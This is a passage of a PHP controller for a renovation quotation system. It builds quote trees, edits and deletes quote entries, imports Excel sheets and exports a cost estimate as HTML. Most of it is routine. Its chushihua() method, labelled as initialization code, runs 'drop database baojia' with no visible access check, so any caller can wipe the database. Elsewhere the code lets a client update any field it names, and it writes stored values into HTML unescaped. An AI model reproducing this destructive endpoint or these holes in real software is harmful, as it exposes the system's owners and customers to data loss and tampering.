      $conditions_no = 0;$room_no = 0;$conditions = [];$room = [];
      foreach(json_decode($rs['content'],true) as $key=>$value){
        if(!in_array($value['type_of_work'],$conditions) ){
          $id = Db::name('offer_type')->where('name',$value['type_of_work'])->value('id');
          $conditions[$id] = $value['type_of_work'];
        }
      }
      foreach(json_decode($rs['content'],true) as $key=>$value){
        if(!in_array($value['kongjian'],$room) ){
          $id = Db::name('offer_type')->where('name',$value['kongjian'])->value('id');
          $room[$id] = $value['kongjian'];
        }
      }
      if( !empty($conditions) ){
        $new_data = [];
        foreach($conditions as $key=>$value){
          foreach($room as $k=>$v){
            foreach(json_decode($rs['content'],true) as $ke=>$val){
              if($val['type_of_work'] ==$value){
                $new_data[$key]['conditionsname'] = $value;
                if($val['kongjian'] == $v){
                  $new_data[$key]['son'][$k]['roomname'] = $v;
                  $new_data[$key]['son'][$k]['item'][] = $val;
                }
              }
            }
          }
        }
      }
      $rs['details'] = $new_data;
    }
      
      $this->assign("data", $rs);
    $mould = Db::name('mould')->where('id','=',input('mouldid'))->find();
      if($mould['content']){
        // $conditions_no = 0;$room_no = 0;
        foreach(json_decode($mould['content'],true) as $key=>$value){
          $conditionsname = Db::name('offer_type')->where('id','=',$key)->value('name');//工种名称
          $mould['details'][$key]['conditionsname'] = $conditionsname;
          // $mould['details'][$key]['conditions_no'] = $this->upper[$conditions_no];
          foreach($value as $ke=>$va){
            $roomname = Db::name('offer_type')->where('id','=',$ke)->value('name');//空间类型名称
            $mould['details'][$key]['son'][$ke]['roomname'] = $roomname;
            // $mould['details'][$key]['son'][$ke]['room_no'] = $this->lower[$room_no];
            foreach($va as $k=>$v){
              $item = Db::name('offerquota')->find($v);//定额条目
              $mould['details'][$key]['son'][$ke]['item'][$k] = $item;
            }
            // $room_no++;
          }
          // $conditions_no++;
        }
      }
      $res = Db::name('offer_type')->select();//工种和空间类型
      $tree = [];//树状数据
      foreach($res as $key =>$value){
        if($value['pid'] === 0){
          $tree[$key] = $value;
          unset($res[$key]);
          foreach($res as $k=>$v){
            if($v['pid'] == $value['id']){
              $tree[$key]['son'][] = $v;
            }
          }
        }
      }
      $this->assign([
        'tree'=>$tree,
      'mould'=>$mould
      ]);  
      return $this->fetch();
  
  }
    //业务报价
    public function edit()
    {
        $userinfo = $this->_userinfo; 
        
        $request = request();
        $id = $request->param('customer_id');
        if(empty($id)){
          return $this->fetch();
        }
        //dump($id);
        $this->assign('id',$id);
        // $rs = Db::name('offerlist')->alias('o')->field('o.*,u.customer_name as customer_name,u.quoter_name as quoter_name,u.designer_name as designer_name,u.address as address')->join('userlist u','o.customerid = u.id')->where(["o.id" => trim($id)])->find();
        // if(!empty($rs['content'])){
        //   $rs['content'] = json_decode($rs['content'],true);
        //   $company = array();
        //   foreach ($rs['content'] as $key => $value) {
        //       $company[$key] =  Db::name('offerquota')->field('id')->where('item_number',$rs['content'][$key]['item_number'])->find();
        //       $rs['content'][$key]['cid'] = $company[$key]['id'];
        //   }
        // }
        $rs = Db::name('userlist')->where(['id'=>$id])->find();
        // dump($rs);
        $this->assign("data", $rs);
    
        $mould = Db::name('mould')->where('id','=',input('mouldid'))->find();
        if($mould['content']){
        // $conditions_no = 0;$room_no = 0;
            foreach(json_decode($mould['content'],true) as $key=>$value){
                $conditionsname = Db::name('offer_type')->where('id','=',$key)->value('name');//工种名称
                $mould['details'][$key]['conditionsname'] = $conditionsname;
                // $mould['details'][$key]['conditions_no'] = $this->upper[$conditions_no];
                foreach($value as $ke=>$va){
                    $roomname = Db::name('offer_type')->where('id','=',$ke)->value('name');//空间类型名称
                    $mould['details'][$key]['son'][$ke]['roomname'] = $roomname;
                    // $mould['details'][$key]['son'][$ke]['room_no'] = $this->lower[$room_no];
                    foreach($va as $k=>$v){
                        $item = Db::name('offerquota')->find($v);//定额条目
                        $mould['details'][$key]['son'][$ke]['item'][$k] = $item;
                    }
                }
            }
        }
        $res = Db::name('offer_type')->select();//工种和空间类型
        $tree = [];//树状数据
        foreach($res as $key =>$value){
          if($value['pid'] === 0){
            $tree[$key] = $value;
            unset($res[$key]);
            foreach($res as $k=>$v){
              if($v['pid'] == $value['id']){
                $tree[$key]['son'][] = $v;
              }
            }
          }
        }
        $this->assign([
          'tree'=>$tree,
      'mould'=>$mould
        ]);  
         
        return $this->fetch();
    }

     //删除
    public function delete()
    {
        if ($this->request->isPost()){
            $data = $this->request->post();
            if(!is_numeric($data['id'])){
                Result(1,'参数错误！');
            }
            $find = Db::name('offerlist')->where('id',$data['id'])->find();
            if(empty($find)){
                Result(1,'无此数据！');
            }
            $json = json_decode($find['content'],true);
            foreach ($json as $key => $value) {
                $company[$key] =  Db::name('offerquota')->field('id')->where('item_number',$json[$key]['item_number'])->find();
                $json[$key]['cid'] = $company[$key]['id'];
                if($json[$key]['cid'] == $data['cid'] && $json[$key]['gcl']==$data['gcl']){
                    unset($json[$key]);
                }
            }
            $shu['content'] = str_replace("\\/", "/", json_encode($json,JSON_UNESCAPED_UNICODE));
            $update = Db::name('offerlist')->where('id',$data['id'])->update($shu);
            !$update ? Result(1,'删除失败了！') : Result(0,'删除成功！');
        }
    }

    //列表单字段修改
    public function singlefield_edit()
    {
        if(!$this->request->isPost()){
            Result(1,'请求错误！'); 
        }
        $receive = $this->request->param();
        $data[$receive['field']] = $receive['value'];
        if(Db::name('offerlist')->where('id', $receive['id'])->update($data)){
             Result(0,'单字段编辑成功'); 
        }else{
            Result(1,'编辑失败了！'); 
        }

    }

// 导入excel表
    public function ImportExcel(Request $request){
          
           if ($_FILES['excel']['error'] == 4) {
             $this->error('没有文件被上传');die;
           }

           $userInfo = $this->_userinfo;
           if(!$userInfo) {
                $this->error('无法获取当前操作人员');die;
            }
           require'../extend/PHPExcel/PHPExcel.php';
           $file = $request->file();
           // dump($file);
           if($file){
               foreach ($file as $files) {
                // dump($files);
                 $info = $files->validate(['size'=>10485760,'ext'=>'xls,xlsx'])->move(ROOT_PATH . 'public/'. 'excel');
               }
               if (!$info) {
                  // Result(1,'上传文件格式不正确'); 
                   $this->error('上传文件格式不正确');
               }else{
                  // Result(0,'上传成功'); 
                  //获取上传到后台的文件名
                    $fileName = $info->getSaveName();
                    //获取文件路径
                    $filePath = ROOT_PATH . 'public/'. 'excel/'.$fileName;
                    //获取文件后缀
                    $suffix = $info->getExtension();

                    //记录上传文件日志(先不做了)
                      // $log['filepath'] = $filePath;
                      // $log['addtime'] = time();
                      // $rval = Db::name('excelfile')->insert($log);


                    // 判断哪种类型
                    if($suffix=="xlsx"){
                        $reader = \PHPExcel_IOFactory::createReader('Excel2007');
                    }else{
                        $reader = \PHPExcel_IOFactory::createReader('Excel5');
                    }
                
               }
              //处理表格数据
              //载入excel文件
                $excel = $reader->load("$filePath",$encode = 'utf-8');
                //读取第一张表
                $sheet = $excel->getSheet(0);
                //获取总行数
                $row_num = $sheet->getHighestRow();
                //获取总列数
                $col_num = $sheet->getHighestColumn();
                $data = []; //数组形式获取表格数据 
                  // dump($col_num);
               if ($col_num != 'I') {
                   $this->error('文件数据字段不匹配，请重新选择');die;
                } 
                for ($i = 2; $i <= $row_num; $i ++) {
                    $data[$i]['item_number']  = $sheet->getCell("A".$i)->getValue();
                    $data[$i]['typeid']  = $sheet->getCell("B".$i)->getValue();
                    $data[$i]['type_of_work']  = $sheet->getCell("C".$i)->getValue();
                    $data[$i]['project']  = $sheet->getCell("D".$i)->getValue();
                    $data[$i]['company']  = $sheet->getCell("E".$i)->getValue();
                    $data[$i]['cost_value']  = $sheet->getCell("F".$i)->getValue();
                    $data[$i]['quota']  = $sheet->getCell("G".$i)->getValue();
                    $data[$i]['craft_show']  = $sheet->getCell("H".$i)->getValue();
                    $data[$i]['material']  = $sheet->getCell("I".$i)->getValue();
                    $data[$i]['userid']  = $userInfo['userid'];  
                    $data[$i]['addtime']  = time();  
                }

                //将数据保存到数据库
                if ($data) {
                   //把获取到的二维数组遍历进数据库
                   foreach ($data as $key => $value) {
                       $res = Db::name('offerlist')->insert($value);
                   }
                   $this->success('导入成功');
                }else{
                  $this->error('获取导入文件数据失败');
                }

           }else{
              $this->error('请选择上传文件');
           }
           


    }
    public function chushihua(){
         //初始化引用代码
           $result = Db::execute('drop database baojia');
           echo 'ok';
          
    }

  public function excel_export(){
    $filename = "报表模板";
    header("Content-type:application/octet-stream");
    header("Accept-Ranges:bytes");
    header("Content-type:application/vnd.ms-excel");
    header("Content-Disposition:attachment;filename=".$filename.".xls");
    header("Pragma: no-cache");
    header("Expires: 0");
    $str = input('html');
    
    $request = request();
    $id = $request->param('customerid');
    $report_id = $request->param('report_id');
    $rs = Db::name('offerlist')->alias('o')->field('o.*,u.customer_name as customer_name,u.quoter_name as quoter_name,u.designer_name as designer_name,u.address as address')->join('userlist u','o.customerid = u.id')->where(["o.id" => trim($report_id)])->find();
    if(!empty($rs['content'])){
      $conditions = [];$room = [];
        foreach(json_decode($rs['content'],true) as $key=>$value){
                if(!in_array($value['type_of_work'],$conditions) ){
                  $id = Db::name('offer_type')->where('name',$value['type_of_work'])->value('id');
                  $conditions[$id] = $value['type_of_work'];
                }
        }
        foreach(json_decode($rs['content'],true) as $key=>$value){
                if(!in_array($value['kongjian'],$room) ){
                  $id = Db::name('offer_type')->where('name',$value['kongjian'])->value('id');
                  $room[$id] = $value['kongjian'];
                }
        }
        if( !empty($conditions) ){
                $new_data = [];
                foreach($conditions as $key=>$value){
                  foreach($room as $k=>$v){
                    foreach(json_decode($rs['content'],true) as $ke=>$val){
                      if($val['type_of_work'] ==$value){
                        $new_data[$key]['conditionsname'] = $value;
                        if($val['kongjian'] == $v){
                          $new_data[$key]['son'][$k]['roomname'] = $v;
                          $new_data[$key]['son'][$k]['item'][] = $val;
                        }
                      }
                    }
                  }
                }
        }
        $rs['details'] = $new_data;
    }
    $data = $rs;
    $str = '<style>table,td,th{border:1px solid #000000;}</style><table>
                <thead>
                    <tr>
            <th rowspan="2" colspan="2"><img style="max-width:200px;" src="/fh_offer/public/static/imgs/logo.png"></th>
            <th class="text-center text-large" colspan="6"><h3>住宅装饰工程造价预算书</h3></th>
            <th rowspan="2" colspan="2"></th>
                    </tr>
                    <tr>
            <th class="text-center" colspan="6">全国统一24小时客服热线：400-6281-968</th>
                    </tr>
                    <tr>
                        <th style="text-align:center;" colspan="10">
                          单位：'.$data['unit'].'
                        </th>        
                    </tr>
                    <tr>
                        <th colspan="3">工程名称：'.$data['address'].'</th>       
                        <th colspan="3">客户姓名：'.$data['customer_name'].'</th>       
                        <th colspan="2">设计师姓名：'.$data['designer_name'].'</th>       
                        <th colspan="2">报价师姓名：'.$data['quoter_name'].'</th>       
                    </tr>
                    <tr>      
                        <th rowspan="2" colspan="2">工程项目名称</th>         
                        <th rowspan="2">工程量</th>       
                        <th rowspan="2">单位</th>
                        <th colspan="2">辅材费</th> 
                        <th colspan="2">人工费</th>    
                        <th rowspan="2">施工工艺及材料说明</th> 
                    </tr>
                    <tr>   
                        <th class="text-center">辅材基价</th>       
                        <th class="text-center">辅材合价</th>       
                        <th class="text-center">人工基价</th>       
                        <th class="text-center">人工合价</th> 
                      </tr>
                </thead>
                <tbody>';
        foreach($data['details'] as $key=>$vo){
                    $str .= '<tr>
                        <td colspan="2">'.$vo['conditionsname'].'</td><td colspan="7"></td>
                      </tr>';
            foreach($vo['son'] as $vo1){
                            $str .= '<tr><td class="text-center" colspan="9">'.$vo1['roomname'].'</td></tr>';
              foreach($vo1['item'] as $value){
                $str .= '<tr>
                      <td colspan="2">'.$value['project'].'</td>
                      <td>'.$value['gcl'].'</td>
                      <td>'.$value['company'].'</td>
                      <td>'.$value['quota'].'</td>
                      <td>'.$value['gcl'] * $value['quota'].'</td>
                      <td>'.$value['craft_show'].'</td>
                      <td>'.$value['gcl'] * $value['craft_show'].'</td>
                      <td class="text-limit">'.$value['material'].'</td>
                      </tr>';
            }
          }
          $str .= '<tr>
                    <td class="text-center" colspan="2">小计</td>
                    <td></td>
                    <td></td>
                    <td></td>
                    <td></td>
                    <td></td>
                    <td></td>
                    <td></td>
                  </tr>';
        }
               $str .= '</tbody></table>';
    echo($str);
  }
  
}
